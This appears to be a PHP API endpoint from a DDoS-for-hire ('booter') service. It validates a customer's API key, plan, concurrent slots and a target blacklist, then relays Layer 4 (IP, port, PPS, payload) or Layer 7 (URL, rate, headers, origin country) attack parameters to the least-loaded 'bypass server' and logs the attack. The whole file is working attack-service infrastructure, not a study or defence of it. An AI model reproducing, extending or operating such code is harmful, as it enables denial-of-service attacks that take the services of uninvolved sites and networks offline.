<?php

// Includes
define('allow', true);
define('pages', true);
include_once('../../inc.php');

// Define
$userID = @$_GET['user'];
$api_key = @$_GET['api_key'];
$Target = urldecode(@$_GET['target']);
$Time = (int) @$_GET['duration'];
$MethodByName = $Methods->MethodsDataName(@$_GET['method'])['name'];
$Method = (int) @$_GET['method'];
$Addons = explode('|', $User->UserDataID(@$userID, 1)['Addons']);
$Mode = $Api->UsersApiDataID($api_key, 1)['Mode'];
$error = '';
$MachineID = '';

if(empty($Target) || empty($Time) || empty($Method)) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => "Please fill all fields!"
        );
    }
}

if(empty($userID)) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => "UserID cant be empty."
        );
    }
}

if(empty($api_key)) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => "API Key cant be empty."
        );
    }
}

// Check is valid API v1
if($Api->UsersApiDataID3($api_key, 1)['api_key'] == $api_key) {
    if($Plan->PlanDataID($User->UserDataID(@$userID, 1)['Plan'])['API'] == 0) {
        if(empty($message)) {
            // Message
            $message = array(
                "status" => 'false',
                "message" => "Your plan doesnt support API Access."
            );
        }
    }
} else {
    if(empty($message)) {
        // Message
        $message = array(
            "status" => 'false',
            "message" => "Invalid User ID / API key."
        );
    }
}

// Is Plan Expired
if($User->UserDataID(@$userID, 1)['Expire'] < time()) {
    if(empty($message)) {
        // Message
        $message = array(
            "status" => 'false',
            "message" => "Your Plan is expired."
        );
    }
}

// Check is IP Whlitelisted
$WL = $Api->UsersApiDataID3($api_key, 1)['WhiteList'];
$IpExplode = explode('|',$Secure->ApiIps($WL));

if(filter_var($IpExplode[0], FILTER_VALIDATE_IP)) {
	if($IpExplode[0] != $User->UserIP()) {
		if($IpExplode[1] != $User->UserIP()) {
			if($IpExplode[2] != $User->UserIP()) {
                if(empty($message)) {
                    // Message
                    $message = array(
                        "status" => 'false',
                        "message" => "This ip is not White Listed"
                    );
                }
			}
		}
	}
}

if(strlen($Target) > 300 || strlen($Target) < 1) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => "Target can be 1-300 characters length."
        );
    }
}

// Check Attack Time
if($Time > $Api->UsersApiDataID3($api_key, 1)['AttackTime']) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Maximum Attack Time is '.$Api->UsersApiDataID3($api_key, 1)['AttackTime'].'.'
        );
        $error = true;
    }
}

// Cant be under 15 seconds
if($Time < 15) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Minimum attack time is 15.'
        );
        $error = true;
    }
}

// Check for BlackList
foreach ($BlackList->BlackListDataAll()['Response'] as $BLk => $BLv) {
    if(strpos($Target, $BLv['word'])) {
        if($BLv['expires'] > time()) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => "You are not allowed to attack these Ip!"
                );
                $error = true;
            }
        }
    }
}

if($Methods->MethodsDataName($Method)['premium'] == 1) {
    if($Api->UsersApiDataID3($api_key, 1)['Mode'] < 1) {
        if($Addon[2] == 0) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => "You cant use Premium method."
                );
                $error = true;
            }
        }
    }
}

if($ALogs->UserAttacks($User->UserDataID(@$userID, 1)['id'])['Count'] >= $Plan->PlanDataID($User->UserDataID(@$userID, 1)['Plan'])['Concurrent']+$Addons[1]) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'You have exceeded your total slots in running.'
        );
        $error = true;
    }
}

if($ALogs->LogsDataRunningOnAPI($api_key, 0)['Count'] >= $Api->UsersApiDataID3($api_key, 1)['Slots']) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'You have exceeded your total slots in running.'
        );
        $error = true;
    }
}

$timer = $ALogs->LastUserAttack($User->UserData()['id'], 1)['date']+5;

if($timer > time()) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Wait '.$timer.' seconds.'
        );
        $error = true;
    }
}

// Check is IP or Website
if(filter_var($Target, FILTER_VALIDATE_IP)) {
	$layer = 4;
} else if(filter_var($Target, FILTER_VALIDATE_URL)) {
	$layer = 7;
} else {
    if(empty($message)) {
        // Message
        $message = array(
            "status" => 'false',
            "message" => "Invalid Target"
        );
    }
}

// Layer 4 Attack
if($layer == 4) {
	// Define for Layer 4
	$Port = (int) @$_GET['port'];

    if($Api->UsersApiDataID3($api_key, 1)['Mode'] >= 1) {
        $Payload = urlencode(@$_GET['payload']);
        $PPS = (int) @$_GET['pps'];
    } else {
        $Payload = '';
        $PPS = $Plan->PlanDataID($User->UserDataID($userID, 1)['Plan'])['PPS'];
    }

    if($Methods->MethodsDataName($Method)['layer'] != 4) {
		if(empty($message)) {
			$message = array(
				"status" => 'false',
				"message" => "This method doesnt exist."
			);
			$error = true;
		}
    }

    if($Port < 1 || $Port > 65535) {
		if(empty($message)) {
			$message = array(
				"status" => 'false',
				"message" => "Invalid Port."
			);
			$error = true;
		}
    }

    if($Api->UsersApiDataID3($api_key, 1)['Mode'] >= 1) {
        if(!empty($Payload)) {
            if(strlen($Payload) > 300 || strlen($Payload) < 1) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => "Payload can be 1-300 characters length."
                    );
                    $error = true;
                }
            }
        }

        if(!empty($PPS)) {
            if($PPS > $Plan->PlanDataID($User->UserDataID($userID, 1)['Plan'])['PPS'] || $PPS < 50000) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => "Invalid PPS."
                    );
                    $error = true;
                }
            }
        } else {
            $PPS = $Plan->PlanDataID($User->UserDataID($userID, 1)['Plan'])['PPS']; 
        }
    }
}

// Layer 7 Attack
else if($layer == 7) {
    if($Api->UsersApiDataID3($api_key, 1)['Mode'] >= 1) {
        $reqmethod = @$_GET['reqmethod'];
        $Rate = @$_GET['rate'];
        $PreCheck = @$_GET['precheck'];
        $statusCode = @$_GET['statuscode'];
        $HData = urlencode(@$_GET['hdata']);
        $Referrer = urlencode(@$_GET['referrer']);
        $Host = urlencode(@$_GET['host']);
        $Origin = @$_GET['origin'];
    }

    // Is Layer 7
    if($Methods->MethodsDataName($Method)['layer'] != 7) {
		if(empty($message)) {
			$message = array(
				"status" => 'false',
				"message" => "This method doesnt exist."
			);
			$error = true;
		}
    }

    if($Api->UsersApiDataID3($api_key, 1)['Mode'] >= 1) {
        // Check Request Method
		if(@$reqmethod == 'GET') {
			$ReqMethod = 'GET';
        } else if(@$reqmethod == 'POST') {
			$ReqMethod = 'POST';
		} else {
			$ReqMethod = 'GET';
		}

		// Is valid Rate
		if (empty($Rate)) {
			$Rate = 64;
		}

		if($Rate > 64 || $Rate < 1) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => "Rate is invalid."
                );
                $error = true;
            }
		}

		// Check PreCheck Status
		if($PreCheck == "false") {
			$PreCheck = false;
		} else if($PreCheck == "true") {
			$PreCheck = true;

            if($statusCode < 1 || $statusCode > 999) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => "Status Code is invalid."
                    );
                    $error = true;
                }
            }
		} else {
			$PreCheck = false;
		}

		// Is valid HData
		if (!empty($HData)) {	
			if(strlen($HData) > 500 || strlen($HData) < 1) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => "Header Data can be 1-500 characters length."
                    );
                    $error = true;
                }
			}
		}

		// Is valid Referrer
		if (!empty($Referrer)) {
			if(!filter_var($Referrer, FILTER_VALIDATE_URL)) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => "Invalid Referrer."
                    );
                    $error = true;
                }
			}

			if(strlen($Referrer) > 500 || strlen($Referrer) < 1) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => "Referrer can be 1-500 characters length."
                    );
                    $error = true;
                }
			}
		}

		// Is valid Target
        if(strlen($Target) > 50 || strlen($Target) < 1) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => "Target can be 1-50 characters length."
                );
                $error = true;
            }
        }

		if(!empty($origin)) {
            if($origin != 'Worldwide') {
                if($origin != 'United_states') {
                    if($origin != 'Germany') {
                        if($origin != 'Brazil') {
                            if($origin != 'Thailand') {
                                if($origin != 'Vietnam') {
                                    if($origin != 'China') {
                                        if($origin != 'Hong_Kong') {
                                            if($origin != 'Korea') {
                                                if($origin != 'Japan') {
                                                    if($origin != 'Italy') {
                                                        if(empty($message)) {
                                                            $message = array(
                                                                "status" => 'false',
                                                                "message" => "Origin is invalid."
                                                            );
                                                            $error = true;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
		} else {
            $origin = 'Worldwide';
        }
	} else {
		$ReqMethod = 'GET';
		$Rate = 64;
		$PreCheck = false;
		$statusCode = 0;
		$HData = '';
		$Referrer = '';
		$Host = '';
		$origin = 'Worldwide';
	}
}

if($error == false) {
    $load = '';

    foreach ($Api->ApiDataAll()['Response'] as $Ak => $Av) { 
        if($Av['layer'] == $layer) { if($Av['status'] == 1) {
            $MethodList = $Api->ApiDataID($Av['id'], 1)['methods'];
            $MethodeExpl = explode('|', $MethodList);

            foreach ($MethodeExpl as $MethodName) {
                if($MethodName == $MethodByName) {
                    $loaded = ($Api->CountApiOfAttacks($Av['id']) / $Av['slots']) * 100;
                    if($loaded != 100) {
                        $loaded_plus = $loaded+1;
                        $load = $load.$loaded_plus.",";
                    }
                }
            }
        } }
    }

    $brojevi = explode(",", $load);
    $najmanji = @min(array_filter($brojevi)) - 1;

    foreach ($Api->ApiDataAll()['Response'] as $Ak => $Av) {
        if($Av['layer'] == $layer) { if($Av['status'] == 1) {                         
            $MethodList = $Api->ApiDataID($Av['id'], 1)['methods'];
            $MethodeExpl = explode('|', $MethodList);

            foreach ($MethodeExpl as $MethodName) {
                if($MethodName == $MethodByName) {
                    $loadednew = ($Api->CountApiOfAttacks($Av['id']) / $Av['slots']) * 100;

                    if(number_format($najmanji, 2) >= number_format($loadednew, 2)) {
                        $MachineID = $Av['id'];
                        break;
                    }
                }
            }
        } }
    }

    if(empty($MachineID)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'No available bypass servers.'
            );
            $error = true;
        }
    }

    if($Api->CountApiOfAttacks($MachineID) >= $Api->ApiDataID($MachineID, 1)['slots']) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'No available bypass servers.'
            );
            $error = true;
        }
    }

    $Stopper = rand(1000000, 9999999);

    // Start Function
    if($layer == 4) {
        $ch = curl_init($Secure->encrypt($Api->ApiDataID($MachineID, 1)['link'])."&Target=$Target&Port=$Port&Time=$Time&Method=".$Methods->MethodsDataID($Method)['name']."&PPS=$PPS&Payload=$Payload&Mode=$Mode&stopper=".$Stopper."&stop=0");
    } else if($layer == 7) {
        $ch = curl_init($Secure->encrypt($Api->ApiDataID($MachineID, 1)['link'])."&Target=".urlencode($Target)."&Port=0&time=$Time&Method=".$Methods->MethodsDataID($Method)['name']."&ReqMethod=$ReqMethod&Rate=$Rate&PreCheck=$PreCheck&statusCode=$statusCode&HData=$HData&Referrer=$Referrer&Host=$Host&Origin=$Origin&Mode=$Mode&stopper=".$Stopper."&stop=0");
    }

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $data = curl_exec($ch);

    $info = curl_getinfo($ch);

    if(curl_errno($ch)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => "API Error! Please contanct support! Server: ".$Api->ApiDataID($MachineID, 1)['name']
            );
            $error = true;
        }
    }

    curl_close($ch);

    if ($data === FALSE) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => "API Error! Please contanct support! Server: ".$Api->ApiDataID($MachineID, 1)['name']
            );
            $error = true;
        }
    }

    // Message
    $response = json_decode($data, true);

    if(strpos($data, 'true')) {
        // Log
        if($layer == 4) {
            $ALogs->CreateLog($userID, $Stopper, $Target, $Port, $Time, $Methods->MethodsDataName($Method)['id'], $Api->ApiDataID($MachineID, 1)['id'], $api_key);
        } else if($layer == 7) {
            $ALogs->CreateLog($userID, $Stopper, $Target, '0', $Time, $Methods->MethodsDataName($Method)['id'], $Api->ApiDataID($MachineID, 1)['id'], $api_key);
        }

        if(empty($message)) {
            $message = array(
                "status" => 'true',
                "message" => $response['message'],
                "stopper" => $Stopper
            );
            // $message = $data;
        }
    } else if(strpos($data, 'error')) {
        if(empty($message)) {
            $message = array(
                "status" => 'error',
                "message" => $response['message']
            );
            // $message = $data;
        }

        // Message
        header("Content-Type: application/json");
        // Encode
        $print = json_encode($message);
        // Print
        print_r($print);
        die();
    } else if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Uknown error. Please contact Support!'
        );

        // Message
        header("Content-Type: application/json");
        // Encode
        $print = json_encode($message);
        // Print
        print_r($print);
        die();
    }
}

if(empty($message)) {
	$message = array(
		"status" => 'false',
		"message" => 'Undefined'
	);
}

// Json App Header
header("Content-Type: application/json");
// Encode
$print = json_encode($message);
// Print
print_r($print);
die();